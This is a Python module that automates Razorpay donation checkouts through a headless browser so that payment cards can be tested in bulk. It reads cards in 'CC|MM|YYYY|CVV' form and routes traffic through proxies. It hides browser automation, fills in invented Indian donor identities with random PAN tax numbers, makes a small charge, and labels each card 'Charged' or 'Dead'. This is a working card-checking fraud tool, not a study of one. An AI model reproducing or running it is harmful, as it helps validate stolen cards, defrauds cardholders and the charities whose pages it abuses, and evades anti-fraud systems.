# =============================================================================
# razorpay_engine.py — API-less Razorpay engine (Playwright based)
# =============================================================================
# Wraps main.py's Playwright flow as a sync/async callable.
#
# Public API:
#   run_razorpay_public(site_url, card, proxy_url) -> dict   [sync]
#   run_razorpay_async(site_url, card, proxy_url) -> dict    [async]
#
# Requires: playwright>=1.47.0
#   pip install playwright
#   playwright install chromium
# =============================================================================

import os
import re
import json
import time
import random
import string
import asyncio
import hashlib
import secrets
import logging
import concurrent.futures
from base64 import b64encode
from urllib.parse import quote
from typing import Optional, Dict, Any

logger = logging.getLogger("razorpay")
if not logger.handlers:
    h = logging.StreamHandler()
    h.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
    logger.addHandler(h)
    logger.setLevel(logging.INFO)

VERSION = "1.0.0"

# ──────────────────────── Constants ──────────────────────────────────

BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

FIRST  = ["Aarav","Vivaan","Aditya","Vihaan","Arjun","Sai","Ishaan","Rohan","Karan",
          "Rahul","Ravi","Amit","Vikram","Anil","Sunil","Rajesh","Sanjay","Deepak",
          "Manoj","Suresh"]
LAST   = ["Sharma","Patel","Singh","Verma","Gupta","Reddy","Kumar","Joshi","Mehta",
          "Nair","Shah","Das","Bose","Chopra","Malhotra","Saxena","Rao","Desai",
          "Pillai","Menon"]
STREETS = ["MG Road","Park Street","Church Street","Linking Road","Banjara Hills",
           "Civil Lines","Marine Drive","Connaught Place","Sector 62",
           "Bannerghatta Road","Lavelle Road","Sadar Bazaar"]
CITIES  = ["Mumbai","Delhi","Bangalore","Hyderabad","Chennai","Kolkata","Pune",
           "Ahmedabad","Jaipur","Lucknow","Surat","Indore"]
PINS    = ["400001","110001","560001","500001","600001","700001","380001","302001",
           "226001","452001","160001","800001"]

BUILD_DEFAULT    = "afa3662e035e66c495f2ddc21c6f030530870f53"
BUILD_V1_DEFAULT = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

LAUNCH_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-blink-features=AutomationControlled",
    "--disable-features=IsolateOrigins,site-per-process",
]


# ──────────────────────── Helpers ────────────────────────────────────

def _rand_phone() -> str:
    return "+91" + str(random.choice([6, 7, 8, 9])) + "".join(str(random.randint(0, 9)) for _ in range(9))

def _rand_name() -> str:
    return f"{random.choice(FIRST)} {random.choice(LAST)}"

def _rand_email(name: str) -> str:
    return name.lower().replace(" ", ".") + str(random.randint(1, 99)) + "@gmail.com"

def _rand_address() -> str:
    i = random.randint(0, len(CITIES) - 1)
    return f"{random.randint(1, 999)} {random.choice(STREETS)}, {CITIES[i]}- {PINS[i]}"

def _rand_pan() -> str:
    return ("".join(random.choices(string.ascii_uppercase, k=5))
            + "".join(random.choices(string.digits, k=4))
            + random.choice(string.ascii_uppercase))

def _build_device_id() -> str:
    h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = str(random.randrange(10 ** 8)).zfill(8)
    return f"1.{h}.{ts}.{rnd}"

def _build_token_create(checkout_id: str) -> str:
    payload = [
        {"name": "sardine", "metadata": {"session_id": checkout_id}},
        {"name": "stripe_radar",
         "metadata": {"session_id": "rse_" + "".join(
             secrets.choice(string.ascii_letters + string.digits) for _ in range(22))}},
    ]
    return b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode()


def parse_proxy(p: Optional[str]) -> Optional[dict]:
    if not p:
        return None
    p = p.strip()
    scheme = "http"
    if "://" in p:
        s = p.split("://", 1)
        if s[0].lower() in ("http", "https", "socks4", "socks5"):
            scheme = s[0].lower()
            p = s[1]
    user = pwd = ""
    if "@" in p:
        auth, host = p.rsplit("@", 1)
        user, _, pwd = auth.partition(":")
    elif p.count(":") == 3:
        ip, port, user, pwd = p.split(":")
        host = f"{ip}:{port}"
    elif p.count(":") == 1:
        host = p
    else:
        return None
    cfg = {"server": f"{scheme}://{host}"}
    if user:
        cfg["username"] = user
        cfg["password"] = pwd
    return cfg


def parse_cc(cc: str) -> dict:
    parts = cc.split("|")
    if len(parts) != 4:
        raise ValueError("CC format must be CC|MM|YYYY|CVV")
    return {
        "number": parts[0].strip().replace(" ", ""),
        "month": parts[1].strip().zfill(2),
        "year": parts[2].strip()[-2:],
        "cvv": parts[3].strip(),
    }


def _classify(raw: str) -> str:
    """Map raw Razorpay response to a short stable code."""
    if not raw:
        return "UNKNOWN"
    r = raw.lower()
    if any(k in r for k in ("captured", "authorized", "payment_id:") and "3ds error" not in r):
        if "captured" in r or "authorized" in r:
            return "CHARGED"
    if "otp_required" in r or "action_required" in r:
        return "OTP_REQUIRED"
    if "3ds" in r:
        return "3DS_REQUIRED"
    if "invalid" in r and "card" in r:
        return "INVALID_CARD"
    if "insufficient" in r:
        return "INSUFFICIENT_FUNDS"
    if "declined" in r or "do not honor" in r:
        return "DECLINED"
    if "not supported" in r:
        return "NOT_SUPPORTED"
    if "timeout" in r:
        return "TIMEOUT"
    if "session_token not found" in r:
        return "NO_SESSION_TOKEN"
    if "merchant data missing" in r:
        return "MERCHANT_DATA_MISSING"
    if "proxy" in r:
        return "PROXY_ERROR"
    return "DECLINED"


# ──────────────────────── Core flow ──────────────────────────────────

async def _run_check_async(site_url: str, cc: str, proxy_cfg: Optional[dict]) -> dict:
    try:
        from playwright.async_api import async_playwright, TimeoutError as PWTimeoutError
    except ImportError as e:
        return {"ok": False, "status": "Error", "message": f"playwright not installed: {e}",
                "response": "playwright not installed", "time": 0.0}

    t0 = time.time()
    card = parse_cc(cc)
    name = _rand_name()
    phone = _rand_phone()
    email = _rand_email(name)
    address = _rand_address()
    pan = _rand_pan()
    device_id = _build_device_id()
    unified_id = "".join(secrets.choice(BASE62) for _ in range(14))

    try:
        pw = await async_playwright().start()
    except Exception as e:
        return {"ok": False, "status": "Error", "message": f"playwright start: {e}",
                "response": f"playwright start: {str(e)[:150]}", "time": round(time.time() - t0, 2)}

    try:
        browser = await pw.chromium.launch(headless=True, proxy=proxy_cfg, args=LAUNCH_ARGS)
    except Exception as e:
        try: await pw.stop()
        except Exception: pass
        return {"ok": False, "status": "Error", "message": f"browser launch: {e}",
                "response": f"browser launch: {str(e)[:150]}", "time": round(time.time() - t0, 2)}

    ctx = await browser.new_context(
        user_agent=UA, viewport={"width": 1366, "height": 768},
        locale="en-IN", timezone_id="Asia/Kolkata",
    )
    await ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
    page = await ctx.new_page()
    page.set_default_timeout(40000)

    try:
        # 1. Load merchant site, extract IDs
        await page.goto(site_url, wait_until="domcontentloaded", timeout=35000)
        merchant = await page.evaluate("""() => {
            const out = {};
            const scan = (obj) => {
                if (!obj || typeof obj !== 'object') return;
                if (obj.keyless_header) out.keyless_header = obj.keyless_header;
                if (obj.key_id) out.key_id = obj.key_id;
                if (obj.payment_link) {
                    out.payment_link_id = obj.payment_link.id;
                    const items = obj.payment_link.payment_page_items || [];
                    if (items[0]) out.payment_page_item_id = items[0].id;
                    const amt = items[0]?.item?.amount || obj.payment_link.min_amount_value;
                    if (amt) out.amount = parseInt(amt, 10);
                }
            };
            scan(window.data);
            scan(window.__INITIAL_STATE__);
            scan(window.__CHECKOUT_DATA__);
            if (!out.keyless_header) {
                for (const s of document.querySelectorAll('script')) {
                    const t = s.textContent || '';
                    let m = t.match(/keyless_header["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.keyless_header = m[1];
                    m = t.match(/key_id["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.key_id = m[1];
                    m = t.match(/payment_link_id["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.payment_link_id = m[1];
                    m = t.match(/payment_page_item_id["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.payment_page_item_id = m[1];
                }
            }
            return out;
        }""")

        needed = ("keyless_header", "key_id", "payment_link_id", "payment_page_item_id")
        missing = [k for k in needed if not merchant.get(k)]
        if missing:
            return {"ok": False, "status": "Error",
                    "message": f"merchant data missing: {', '.join(missing)}",
                    "response": f"merchant data missing: {', '.join(missing)}",
                    "time": round(time.time() - t0, 2)}

        keyless_header = merchant["keyless_header"]
        key_id = merchant["key_id"]
        payment_link_id = merchant["payment_link_id"]
        payment_page_item_id = merchant["payment_page_item_id"]
        amount = int(merchant.get("amount") or 100)
        if amount < 100: amount = 100

        # 2. Load Razorpay checkout
        params = {
            "traffic_env": "production", "build": BUILD_DEFAULT,
            "build_v1": BUILD_V1_DEFAULT, "checkout_v2": "1", "new_session": "1",
            "keyless_header": keyless_header, "rzp_device_id": device_id,
            "unified_session_id": unified_id,
        }
        qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in params.items())
        await page.goto(f"https://api.razorpay.com/v1/checkout/public?{qs}",
                        wait_until="domcontentloaded", timeout=35000)

        session_token = await page.evaluate("""() => {
            if (window.session_token) return window.session_token;
            const html = document.documentElement.innerHTML;
            const m = html.match(/session_token["']?\\s*[:=]\\s*["']([A-F0-9]{40,})["']/);
            return m ? m[1] : null;
        }""")
        if not session_token:
            return {"ok": False, "status": "Error", "message": "session_token not found",
                    "response": "session_token not found", "time": round(time.time() - t0, 2)}

        # 3. Create order
        order_id = await page.evaluate("""async ([pl, ppi, amt]) => {
            try {
                const r = await fetch(`https://api.razorpay.com/v1/payment_pages/${pl}/order`, {
                    method: 'POST',
                    headers: {'Accept':'application/json','Content-Type':'application/json'},
                    body: JSON.stringify({
                        notes: {comment: '', name: 'Donor'},
                        line_items: [{payment_page_item_id: ppi, amount: amt}]
                    })
                });
                const d = await r.json();
                if (d.order) return d.order.id;
                if (d.error) return 'ERR:' + JSON.stringify(d.error);
                return null;
            } catch (e) { return 'ERR:' + e.message; }
        }""", [payment_link_id, payment_page_item_id, amount])

        if not order_id or str(order_id).startswith("ERR:"):
            return {"ok": False, "status": "Error", "message": f"order failed: {order_id}",
                    "response": f"order failed: {order_id}", "time": round(time.time() - t0, 2)}

        checkout_id = order_id.split("_", 1)[1] if "_" in order_id else order_id
        token_create = _build_token_create(checkout_id)

        payload = {
            "notes[comment]": "", "notes[email]": email, "notes[phone]": phone[3:],
            "notes[full_name_of_the_donor]": name, "notes[full_address_of_the_donor]": address,
            "notes[pan_number]": pan, "payment_link_id": payment_link_id, "key_id": key_id,
            "callback_url": "https://your-server.com/callback", "contact": phone, "email": email,
            "currency": "INR", "user_risk_providers_token": token_create,
            "_[integration]": "payment_pages", "_[checkout_id]": checkout_id,
            "_[device.id]": device_id, "_[library]": "checkoutjs", "_[library_src]": "no-src",
            "_[current_script_src]": "no-src", "_[platform]": "browser", "_[env]": "",
            "_[is_magic_script]": "false", "_[os]": "windows", "_[referer]": site_url,
            "_[shield][fhash]": hashlib.sha1(secrets.token_bytes(16)).hexdigest(),
            "_[shield][tz]": "330", "_[shield][os]": "windows", "_[shield][platform]": "browser",
            "_[shield][browser]": "chrome", "_[device_id]": device_id,
            "_[build]": BUILD_DEFAULT, "_[request_index]": "1",
            "amount": str(amount), "order_id": order_id, "method": "card",
            "card[number]": card["number"], "card[cvv]": card["cvv"], "card[name]": name,
            "card[expiry_month]": card["month"], "card[expiry_year]": card["year"],
            "save": "0",
        }

        # 4. Post create payment
        result = await page.evaluate("""async ([payload, k, st, kh]) => {
            const qs = new URLSearchParams({key_id: k, session_token: st, keyless_header: kh});
            const body = new URLSearchParams();
            for (const [key, val] of Object.entries(payload)) body.append(key, val);
            try {
                const url = `https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?${qs.toString()}`;
                const r = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'x-session-token': st,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://api.razorpay.com',
                        'Referer': `https://api.razorpay.com/v1/checkout/public?session_token=${st}`
                    },
                    body: body.toString()
                });
                const text = await r.text();
                let parsed; try { parsed = JSON.parse(text); } catch { parsed = text; }
                return {status: r.status, raw: text.slice(0, 800), body: parsed};
            } catch (e) { return {status: 0, raw: '', body: 'NETWORK:' + e.message}; }
        }""", [payload, key_id, session_token, keyless_header])

        status_code = result.get("status", 0) if isinstance(result, dict) else 0
        raw_debug   = result.get("raw", "") if isinstance(result, dict) else ""
        body        = result.get("body") if isinstance(result, dict) else result
        payment_id  = None

        if isinstance(body, dict):
            payment_id = (body.get("payment_id")
                          or body.get("razorpay_payment_id")
                          or (body.get("payment") or {}).get("id"))

            # 3DS flow
            if body.get("redirect") is True or body.get("type") == "redirect":
                redirect_url = ""
                if isinstance(body.get("request"), dict):
                    redirect_url = body["request"].get("url", "")
                if redirect_url:
                    try:
                        await page.goto(redirect_url, wait_until="domcontentloaded", timeout=40000)
                        html = await page.content()
                        if "razorpay_signature" in html:
                            return {"ok": True, "status": "Charged",
                                    "message": f"payment_id: {payment_id or 'n/a'} | redirect | captured",
                                    "response": f"payment_id: {payment_id or 'n/a'} | redirect | captured",
                                    "payment_id": payment_id, "order_id": order_id,
                                    "time": round(time.time() - t0, 2)}
                        status = await page.evaluate("""async ([pid, k, st, kh]) => {
                            const qs = new URLSearchParams({key_id: k, session_token: st, keyless_header: kh});
                            try {
                                const r = await fetch(`https://api.razorpay.com/v1/standard_checkout/payments/${pid}?${qs}`, {
                                    headers: {'x-session-token': st}
                                });
                                const d = await r.json();
                                return d.status || 'unknown';
                            } catch { return 'unknown'; }
                        }""", [payment_id, key_id, session_token, keyless_header])
                        ok = status in ("captured", "authorized")
                        return {"ok": ok, "status": "Charged" if ok else "Declined",
                                "message": f"payment_id: {payment_id} | 3ds | status: {status}",
                                "response": f"payment_id: {payment_id} | 3ds | status: {status}",
                                "payment_id": payment_id, "order_id": order_id,
                                "time": round(time.time() - t0, 2)}
                    except Exception as e:
                        return {"ok": False, "status": "Error",
                                "message": f"3ds error: {str(e)[:120]}",
                                "response": f"3ds error: {str(e)[:120]}",
                                "payment_id": payment_id, "order_id": order_id,
                                "time": round(time.time() - t0, 2)}
                return {"ok": False, "status": "Error", "message": "3ds redirect without url",
                        "response": "3ds redirect without url", "time": round(time.time() - t0, 2)}

            if "razorpay_signature" in body or "signature" in body:
                return {"ok": True, "status": "Charged",
                        "message": f"payment_id: {payment_id or 'n/a'} | captured",
                        "response": f"payment_id: {payment_id or 'n/a'} | captured",
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            if "error" in body:
                err = body["error"]
                desc = err.get("description") or err.get("reason") or str(err)
                return {"ok": False, "status": "Dead",
                        "message": f"[HTTP {status_code}] {desc}",
                        "response": f"[HTTP {status_code}] {desc} | raw: {raw_debug[:400]}",
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            if body.get("status") in ("captured", "authorized"):
                return {"ok": True, "status": "Charged",
                        "message": f"payment_id: {payment_id or 'n/a'} | status: {body['status']}",
                        "response": f"payment_id: {payment_id or 'n/a'} | status: {body['status']}",
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            return {"ok": False, "status": "Dead",
                    "message": f"[HTTP {status_code}] {json.dumps(body)[:300]}",
                    "response": f"[HTTP {status_code}] {json.dumps(body)[:300]} | raw: {raw_debug[:300]}",
                    "payment_id": payment_id, "order_id": order_id,
                    "time": round(time.time() - t0, 2)}

        return {"ok": False, "status": "Error",
                "message": f"[HTTP {status_code}] {str(body)[:200]}",
                "response": f"[HTTP {status_code}] {str(body)[:200]}",
                "time": round(time.time() - t0, 2)}

    except Exception as e:
        return {"ok": False, "status": "Error", "message": str(e)[:150],
                "response": f"error: {str(e)[:150]}", "time": round(time.time() - t0, 2)}
    finally:
        try: await ctx.close()
        except Exception: pass
        try: await browser.close()
        except Exception: pass
        try: await pw.stop()
        except Exception: pass


# ──────────────────────── Public API ─────────────────────────────────

def run_razorpay_public(site_url: str, card: str, proxy_url: str = "") -> dict:
    """Sync entry point. Safe to call from any thread."""
    proxy_cfg = parse_proxy(proxy_url) if proxy_url else None
    try:
        return asyncio.run(_run_check_async(site_url, card, proxy_cfg))
    except RuntimeError:
        # we're inside a running loop — spin a new thread
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
            return ex.submit(
                lambda: asyncio.run(_run_check_async(site_url, card, proxy_cfg))
            ).result()


async def run_razorpay_async(site_url: str, card: str, proxy_url: str = "") -> dict:
    proxy_cfg = parse_proxy(proxy_url) if proxy_url else None
    return await _run_check_async(site_url, card, proxy_cfg)


def engine_stats() -> dict:
    return {"version": VERSION, "engine": "playwright"}
